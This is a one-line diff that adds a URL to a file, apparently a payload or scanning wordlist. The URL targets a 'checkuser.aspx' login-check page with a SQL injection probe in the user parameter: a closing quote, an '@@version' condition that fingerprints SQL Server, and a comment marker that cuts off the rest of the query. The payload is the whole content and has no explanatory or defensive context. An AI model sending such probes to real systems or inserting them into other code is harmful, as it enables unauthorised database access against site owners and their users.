@@ -1,0 +1,1 @@
+/client/checkuser.aspx?user=%27and%20@@version>0--&pwd=1
